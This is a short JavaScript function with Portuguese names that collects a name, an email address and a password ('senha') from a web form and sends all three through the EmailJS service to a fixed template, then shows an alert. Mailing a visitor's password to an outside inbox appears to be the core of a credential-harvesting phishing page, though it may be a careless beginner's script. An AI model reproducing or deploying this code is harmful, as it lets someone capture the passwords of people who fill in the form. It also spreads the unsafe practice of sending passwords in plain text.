function EnviarEmail(){
    var templateParams = {
        name : document.getElementById("name").value,
        email : document.getElementById("email").value,
        senha : document.getElementById("senha").value,
    }
emailjs.send("service_kglv25t","template_sqyo179",templateParams).then(alert('OLA'));


}
